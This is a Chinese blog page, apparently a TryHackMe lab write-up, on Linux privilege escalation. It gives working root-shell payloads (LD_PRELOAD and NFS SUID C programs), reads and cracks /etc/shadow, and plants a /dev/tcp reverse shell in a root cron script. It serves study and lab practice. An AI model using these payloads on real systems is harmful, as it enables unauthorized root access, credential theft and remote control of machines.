@@ -1,0 +1,524 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="特权升级是一段旅程。没有灵丹妙药，很大程度上取决于目标系统的具体配置。内核版本、已安装的应用程序、支持的编程语言、其他用户的密码是影响您通往 root shell 之路的几个关键因素。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Linux提权">
+<meta property="og:url" content="http://example.com/2022/05/28/Linux%E6%8F%90%E6%9D%83/index.html">
+<meta property="og:site_name" content="SugarCrash!">
+<meta property="og:description" content="特权升级是一段旅程。没有灵丹妙药，很大程度上取决于目标系统的具体配置。内核版本、已安装的应用程序、支持的编程语言、其他用户的密码是影响您通往 root shell 之路的几个关键因素。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s2.loli.net/2022/05/28/LhkCVHQsWGTioyz.png">
+<meta property="og:image" content="https://s2.loli.net/2022/05/28/AsmZ2Id4rFV7XO8.png">
+<meta property="og:image" content="https://s2.loli.net/2022/05/28/JDLn3T5daz2q4E9.png">
+<meta property="og:image" content="https://s2.loli.net/2022/05/28/PdzKs4a8nJbri7I.png">
+<meta property="og:image" content="https://s2.loli.net/2022/05/28/wHDrEWBpv2KSjco.png">
+<meta property="og:image" content="https://s2.loli.net/2022/05/28/kuZ41oMwtb39mTy.png">
+<meta property="og:image" content="https://s2.loli.net/2022/05/28/ozGEfSK2I8gsVx1.png">
+<meta property="og:image" content="https://s2.loli.net/2022/05/28/jzVMsRycrQh8Igv.png">
+<meta property="og:image" content="https://s2.loli.net/2022/05/28/XdRr7oxaGcSZejH.png">
+<meta property="og:image" content="https://s2.loli.net/2022/05/28/gLxWDRI6a7Ujmqz.png">
+<meta property="og:image" content="https://s2.loli.net/2022/05/28/ZDU7wm12OQI9LHl.png">
+<meta property="og:image" content="https://s2.loli.net/2022/05/28/9bRfN6G74dxOM8r.png">
+<meta property="og:image" content="https://s2.loli.net/2022/05/28/5PjUTZYHrOLhFzS.png">
+<meta property="og:image" content="https://s2.loli.net/2022/05/28/weJZ92g8pxzqh5c.png">
+<meta property="og:image" content="https://s2.loli.net/2022/05/28/GqVoONzuFxWU7Ty.png">
+<meta property="og:image" content="https://s2.loli.net/2022/05/28/9virN6uqXDHmP2C.png">
+<meta property="og:image" content="https://s2.loli.net/2022/05/28/zhYT8ZjfrOygBGS.png">
+<meta property="og:image" content="https://s2.loli.net/2022/05/28/x1ne2OpwqHPLmQ5.png">
+<meta property="og:image" content="https://s2.loli.net/2022/05/28/cyHRW367C9AFe4m.png">
+<meta property="og:image" content="https://s2.loli.net/2022/05/28/D4rMNXiU6poKLvJ.png">
+<meta property="og:image" content="https://s2.loli.net/2022/05/28/BQONsHTvh48G6i1.png">
+<meta property="og:image" content="https://s2.loli.net/2022/05/28/dywCfgoLnsIOt83.png">
+<meta property="article:published_time" content="2022-05-28T05:48:18.000Z">
+<meta property="article:modified_time" content="2022-05-28T05:53:02.281Z">
+<meta property="article:author" content="Lu1i丶">
+<meta property="article:tag" content="Tryhackme">
+<meta property="article:tag" content="权限提升">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.loli.net/2022/05/28/LhkCVHQsWGTioyz.png">
+
+<link rel="canonical" href="http://example.com/2022/05/28/Linux%E6%8F%90%E6%9D%83/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Linux提权 | SugarCrash!</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">SugarCrash!</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">记录学习，想找个师傅带带我</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/28/Linux%E6%8F%90%E6%9D%83/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/1.PNG">
+      <meta itemprop="name" content="Lu1i丶">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="SugarCrash!">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Linux提权
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-05-28 13:48:18 / 修改时间：13:53:02" itemprop="dateCreated datePublished" datetime="2022-05-28T13:48:18+08:00">2022-05-28</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Tryhackme/" itemprop="url" rel="index"><span itemprop="name">Tryhackme</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Tryhackme/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/" itemprop="url" rel="index"><span itemprop="name">权限提升</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>特权升级是一段旅程。没有灵丹妙药，很大程度上取决于目标系统的具体配置。内核版本、已安装的应用程序、支持的编程语言、其他用户的密码是影响您通往 root shell 之路的几个关键因素。</p>
+<span id="more"></span>
+<h4 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hostname             主机名 </span><br><span class="line">uname-a              打印系统信息看内核 </span><br><span class="line"><span class="built_in">cat</span> /proc/version    看有没有编译器比如GCC </span><br><span class="line"><span class="built_in">cat</span> /etc/issue       看是什么linux</span><br></pre></td></tr></table></figure>
+
+<h4 id="ps命令"><a href="#ps命令" class="headerlink" title="ps命令"></a>ps命令</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ps 查看进程 </span><br><span class="line">ps -A: 查看所有正在运行的进程 </span><br><span class="line">ps axjf：查看进程树（查看树的形成直到ps axjf下面运行） </span><br><span class="line">ps aux： 该aux 选项将显示所有用户的进程 (a)，显示启动进程的用户 (u)，并显示未连接到终端的进程 (x)。 查看 </span><br><span class="line">ps aux 命令输出，我们可以更好地了解系统和潜在的漏洞。</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">env</span> 显示环境变量 </span><br><span class="line">PATH 变量可能具有编译器或脚本语言（例如 Python），可用于在目标系统上运行代码或用于权限提升。 </span><br><span class="line">sudo -l </span><br><span class="line">目标系统可以配置为允许用户以 root 权限运行一些（或全部）命令。该 </span><br><span class="line">sudo -l  命令可用于列出您的用户可以使用运行的所有命令sudo。 </span><br><span class="line"><span class="built_in">ls</span> -la 寻找潜在权限提升向量</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2022/05/28/LhkCVHQsWGTioyz.png"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/passwd                 发现系统用户的好办法 </span><br><span class="line"><span class="built_in">cat</span> /etc/passwd | <span class="built_in">cut</span> -d <span class="string">&quot;1&quot;</span> -f 1 </span><br><span class="line"><span class="built_in">cat</span> /etc/passwd |grep home      一些系统用户是放在home目录下的 </span><br><span class="line"><span class="built_in">history</span>                         查看之前执行的命令可能会有新发现用户名或密码 </span><br><span class="line">ifconfig                        网络接口信息 </span><br><span class="line">ip route                        查看存在哪些网络路由 </span><br><span class="line">netstat                         收集有关现有连接的信息。 </span><br><span class="line">netstat -a                      显示所有监听端口和已建立的连接。 </span><br><span class="line">netstat -at                     或者 netstat -au也可以用来分别列出 TCP 或 UDP 协议。 </span><br><span class="line">netstat -ano</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2022/05/28/AsmZ2Id4rFV7XO8.png"></p>
+<h4 id="find命令"><a href="#find命令" class="headerlink" title="find命令"></a>find命令</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">find . -name flag1.txt:       在当前目录中找到名为“flag1.txt”的文件 </span><br><span class="line">find / -name flag1.txt:       在根目录中找到名为“flag1.txt”的文件 </span><br><span class="line">find /home -name flag1.txt:   在 /home 目录中找到文件名“flag1.txt” </span><br><span class="line">find / -<span class="built_in">type</span> d -name config:  在“/”下找到名为config的目录 </span><br><span class="line">find / -<span class="built_in">type</span> f -perm 0777：   查找具有777权限的文件（所有用户可读、可写和可执行的文件） </span><br><span class="line">find / -perm a=x:            查找可执行文件 </span><br><span class="line">find /home -user frank:      在“/home”下查找用户“frank”的所有文件 </span><br><span class="line">find / -mtime 10:            查找最近 10 天内修改过的文件 </span><br><span class="line">find / -atime 10:            查找过去 10 天内访问过的文件 </span><br><span class="line">find / -cmin -60:            查找在过去一小时（60 分钟）内更改的文件 </span><br><span class="line">find / -amin -60:            查找最近一小时（60 分钟）内的文件访问 </span><br><span class="line">find / -size 50M:            查找大小为 50 MB 的文件 locate passwd 查找passwd文件</span><br></pre></td></tr></table></figure>
+
+<h4 id="自动提权枚举工具"><a href="#自动提权枚举工具" class="headerlink" title="自动提权枚举工具"></a>自动提权枚举工具</h4><p>有几个工具可以帮助您在枚举过程中节省时间。这些工具应该只用于节省时间，因为它们可能会错过一些特权升级向量。以下是流行的 Linux 枚举工具列表，其中包含指向其各自 Github 存储库的链接。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">LinPeas：https ://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS   这个输出太多，没点水平还真看不懂，比如我</span><br><span class="line">LinEnum：https ://github.com/rebootuser/LinEnum </span><br><span class="line">LES（Linux Exploit Suggester）： https ://github.com/mzet-/linux-exploit-suggester </span><br><span class="line">Linux智能枚举： https://github.com/diego-treitos/linux-smart-enumeration     这个枚举内核漏洞</span><br><span class="line">Linux隐私检查器： https://github.com/linted/linuxprivchecker</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="sudo-l"><a href="#sudo-l" class="headerlink" title="sudo -l"></a>sudo -l</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> karen on ip-10-10-148-237:</span><br><span class="line">	env_reset, mail_badpass,</span><br><span class="line">secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User karen may run the following commands on ip-10-10-148-237:</span><br><span class="line">	(ALL) NOPASSWD: /usr/bin/find</span><br><span class="line">	(ALL) NOPASSWD: /usr/bin/less</span><br><span class="line">	(ALL) NOPASSWD: /usr/bin/nano</span><br><span class="line"></span><br><span class="line">知道了可以使用sudo 运行find less nano</span><br><span class="line"></span><br><span class="line">用这个查命令尝试提权</span><br><span class="line"></span><br><span class="line">https://gtfobins.github.io/</span><br></pre></td></tr></table></figure>
+
+<h4 id="LD-PRELOAD-滥用"><a href="#LD-PRELOAD-滥用" class="headerlink" title="LD_PRELOAD 滥用"></a>LD_PRELOAD 滥用</h4><p><img src="https://s2.loli.net/2022/05/28/JDLn3T5daz2q4E9.png"></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span> </span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> _init() &#123; </span><br><span class="line">unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>); </span><br><span class="line">setgid(<span class="number">0</span>); </span><br><span class="line">setuid(<span class="number">0</span>); </span><br><span class="line">system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gcc -fPIC -shared -o shell.so shell.c -nostartfiles sudo LD_PRELOAD=/home/user/ldpreload/shell.so find</span><br></pre></td></tr></table></figure>
+
+<p>SUID提权<br><img src="https://s2.loli.net/2022/05/28/PdzKs4a8nJbri7I.png"></p>
+<p>一个方法是在<a target="_blank" rel="noopener" href="https://gtfobins.github.io/%E8%BF%99%E9%87%8C%E9%9D%A2%E6%89%BEsuid%E5%AF%B9%E5%BA%94%E7%9A%84%E7%A8%8B%E5%BA%8F%EF%BC%8C">https://gtfobins.github.io/这里面找suid对应的程序，</a><br><code>find / -type f -perm -04000 -ls 2&gt;/dev/null</code> 这个命令是看我们可以执行哪些root命令 可以用这些命令读取一些敏感文件比如base64命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">base64</span> /etc/passwd | <span class="built_in">base64</span> --decode</span><br><span class="line"><span class="built_in">base64</span> /etc/shadow | <span class="built_in">base64</span> --decode</span><br><span class="line"></span><br><span class="line">读取到的两个文件保存为password.txt 和shadow.txt 粘贴到本地的kali机上</span><br><span class="line">用unshadow工具 组合成一个文件</span><br><span class="line">unshadow passwd.txt shadow.txt &gt; crackme.txt</span><br><span class="line">用john破解<span class="built_in">hash</span>登录就行了</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">unshadow passwd.txt shadow.txt &gt; passwords.txt </span><br><span class="line">john passwords.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2022/05/28/wHDrEWBpv2KSjco.png"></p>
+<h4 id="Capabilities"><a href="#Capabilities" class="headerlink" title="Capabilities"></a>Capabilities</h4><p>系统管理员可以用来提高进程或二进制文件权限级别的另一种方法是“Capabilities”。功能有助于在更精细的级别上管理权限。</p>
+<p>例如，如果 SOC 分析师需要使用需要启动套接字连接的工具，普通用户将无法做到这一点。</p>
+<p>如果系统管理员不想给这个用户更高的权限，他们可以改变二进制文件的能力。<br>结果，二进制文件无需更高权限的用户即可完成其任务。</p>
+<p>列出有二进制文件具有设置功能的 getcap -r &#x2F;会产生大量错误，所有将消息重定向到 &#x2F;dev&#x2F;null<br><img src="https://s2.loli.net/2022/05/28/kuZ41oMwtb39mTy.png"></p>
+<p>发现有vim还有view也是可以通过Capabilities来提权的<br><img src="https://s2.loli.net/2022/05/28/ozGEfSK2I8gsVx1.png"><br><img src="https://s2.loli.net/2022/05/28/jzVMsRycrQh8Igv.png"><br><img src="https://s2.loli.net/2022/05/28/XdRr7oxaGcSZejH.png"><br>输入命令即可，根据python版本不同，可能需要py3<br><img src="https://s2.loli.net/2022/05/28/gLxWDRI6a7Ujmqz.png"></p>
+<h4 id="计划任务提权"><a href="#计划任务提权" class="headerlink" title="计划任务提权"></a>计划任务提权</h4><p>Cron jobs用于在特定时间运行脚本或二进制文件。默认情况下，它们以其所有者而不是当前用户的权限运行。</p>
+<p>虽然正确配置的 cron 作业本身并不容易受到攻击，但它们可以在某些情况下提供权限提升向量。<br>这个想法很简单。<br>如果有一个以 root 权限运行的计划任务，我们可以更改将要运行的脚本，那么我们的脚本将以 root 权限运行。<br>我们需要做的是找一个由root设置的cron job并让它运行我们的脚本，最好是反弹shell<br>任何用户都可以读取保存系统范围cron job的文件，<code>/etc/crontab</code><br><code>cat /etc/crontab</code><br><img src="https://s2.loli.net/2022/05/28/ZDU7wm12OQI9LHl.png"><br>他们创建了一个antiviruns.sh的文件，一段时间后这个脚本没用了，他们就删了，但可能不会去删计划任务表里面的这个任务<br>所以就有了可以提权的机会<br>上面删除了<strong>antiviruns.sh</strong>文件，但<strong>cron job</strong>仍然存在，并且没有像<strong>backup.sh</strong>一样定义脚本的完整路径，cron将引用*&#x2F;etc&#x2F;crontab*文件中<strong>PATH</strong>变量下列出的路径，这种情况下，我们应该能够在用户的home文件夹创建一个同一个名称的脚本。<br><img src="https://s2.loli.net/2022/05/28/9bRfN6G74dxOM8r.png"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /home/karen /移动到PATH文件夹下 </span><br><span class="line">vim antivirus.sh </span><br><span class="line"></span><br><span class="line"><span class="comment">#!/bin/bash </span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/10.13.40.87/7777 0&gt;&amp;1 </span><br><span class="line">发现弹不起 </span><br><span class="line">vim backup.sh </span><br><span class="line">加一句 </span><br><span class="line">bash -i &gt;&amp; /dev/tcp/10.13.40.87/7777 0&gt;&amp;1 </span><br><span class="line">提权成功</span><br></pre></td></tr></table></figure>
+<h4 id="PATH提权"><a href="#PATH提权" class="headerlink" title="PATH提权"></a>PATH提权</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="variable">$PATH</span>              查看当前的环境变量 </span><br><span class="line">find / -writable 2&gt;/dev/null      搜索可写文件夹 </span><br><span class="line">find / -writable 2&gt;/dev/null | <span class="built_in">cut</span> -d <span class="string">&quot;/&quot;</span> -f 2,3 | grep -v proc | <span class="built_in">sort</span>  过滤掉 procs  发现/home/murdoch文件夹可写</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2022/05/28/5PjUTZYHrOLhFzS.png"><br><img src="https://s2.loli.net/2022/05/28/weJZ92g8pxzqh5c.png"><br>创建thm文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo su -</span><br><span class="line">bash</span><br></pre></td></tr></table></figure>
+<p>更改环境变量为当前目录<br><img src="https://s2.loli.net/2022/05/28/GqVoONzuFxWU7Ty.png"></p>
+<h4 id="NFS提权"><a href="#NFS提权" class="headerlink" title="NFS提权"></a>NFS提权</h4><p>特权升级向量并不局限于内部访问。<br>共享文件夹和远程管理界面（如 SSH 和 Telnet）也可以帮助您获得目标系统的 root 访问权限。<br>某些情况还需要同时使用这两个向量，例如在目标系统上找到一个根 SSH 私钥并通过具有根权限的 SSH 连接，而不是尝试提高当前用户的权限级别。<br>配置错误的网络外壳。当存在网络备份系统时，有时可以在渗透测试期间看到此向量。<br><strong>NFS（网络文件共享）</strong>配置保存在 <strong>&#x2F;etc&#x2F;exports</strong> 文件中。此文件是在 NFS 服务器安装期间创建的，<strong>通常可供用户读取</strong>。</p>
+<p><img src="https://s2.loli.net/2022/05/28/9virN6uqXDHmP2C.png"><br>重点是<strong>no_root_squash</strong>选项默认情况下，NFS 会将 root 用户更改为 nfsnobody 并剥夺任何文件以 root 权限操作。<br>如果可写共享上存在“<strong>no_root_squash</strong>”选项，我们可以创建一个设置了 SUID 位的可执行文件并在目标系统上运行它。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">showmount -e 10.10.66.180        检查一下可挂载共享</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2022/05/28/zhYT8ZjfrOygBGS.png"><br>在kali机上</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount -o rw 10.10.66.180:/home/ubuntu/sharedfolder /tmp/sharedfolder</span><br></pre></td></tr></table></figure>
+<p>创建一个main.c提权payload</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span> </span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> </span><br><span class="line">&#123; </span><br><span class="line">	setgid(<span class="number">0</span>); </span><br><span class="line">	setuid(<span class="number">0</span>); </span><br><span class="line">	system(<span class="string">&quot;/bin/bash&quot;</span>); </span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gcc main .c -o pwned -w  </span><br><span class="line">复制它并修改权限 </span><br><span class="line"><span class="built_in">cp</span> pwned /tmp/sharedfolder </span><br><span class="line">sudo <span class="built_in">chown</span> root:root /tmp/sharedfolder/pwned </span><br><span class="line">sudo <span class="built_in">chmod</span> +s /tmp/sharedfolder/pwned</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>在受害机上<br><img src="https://s2.loli.net/2022/05/28/x1ne2OpwqHPLmQ5.png"></p>
+<h4 id="综合练习"><a href="#综合练习" class="headerlink" title="综合练习"></a>综合练习</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">uname</span> -a </span><br><span class="line">Linux ip-10-10-19-149 3.10.0-1160.el7.x86_64 <span class="comment">#1 SMP Mon Oct 19 16:18:59 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux </span></span><br><span class="line">没找到提权相关漏洞</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find / -<span class="built_in">type</span> f -perm -04000 -<span class="built_in">ls</span> 2&gt;/dev/null </span><br><span class="line">发现了<span class="built_in">base64</span>可以读/etc/shadow和/etc/passwd 跑john</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2022/05/28/cyHRW367C9AFe4m.png"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">base64</span> /etc/shadow | <span class="built_in">base64</span> -d </span><br><span class="line"><span class="built_in">base64</span> /etc/passwd | <span class="built_in">base64</span> -d </span><br><span class="line">unshadow /etc/shadow.txt /etc/passwd.txt &gt; passwords.txt </span><br><span class="line">john passwords.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt </span><br><span class="line">跑出了一个新用户</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2022/05/28/D4rMNXiU6poKLvJ.png"></p>
